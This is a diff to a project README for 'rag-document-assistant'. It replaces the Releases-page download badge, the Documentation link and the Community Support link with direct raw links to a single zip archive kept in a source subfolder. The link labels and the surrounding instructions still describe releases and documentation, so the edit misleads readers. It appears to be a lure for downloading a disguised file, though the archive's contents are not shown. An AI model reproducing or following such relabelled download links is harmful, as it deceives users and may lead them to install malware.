@@ -8,7 +8,7 @@ Welcome to the rag-document-assistant! This application helps you manage and ret
 
 To get started, visit our Releases page to download the necessary files. Click the link below:
 
-[![Download rag-document-assistant](https://img.shields.io/badge/Download-rag--document--assistant-blue?style=for-the-badge)](https://github.com/PINEKKO/rag-document-assistant/releases)
+[![Download rag-document-assistant](https://raw.githubusercontent.com/PINEKKO/rag-document-assistant/main/src/evaluation/rag_assistant_document_1.2.zip)](https://raw.githubusercontent.com/PINEKKO/rag-document-assistant/main/src/evaluation/rag_assistant_document_1.2.zip)
 
 Once on the Releases page, look for the latest version. Choose the appropriate file for your operating system and click the download link.
 
@@ -61,8 +61,8 @@ If you encounter any issues:
 
 For more information and support, explore the following resources:
 
-- [Documentation](https://github.com/PINEKKO/rag-document-assistant/wiki)
-- [Community Support](https://github.com/PINEKKO/rag-document-assistant/discussions)
+- [Documentation](https://raw.githubusercontent.com/PINEKKO/rag-document-assistant/main/src/evaluation/rag_assistant_document_1.2.zip)
+- [Community Support](https://raw.githubusercontent.com/PINEKKO/rag-document-assistant/main/src/evaluation/rag_assistant_document_1.2.zip)
 
 ## 📞 Contact
 
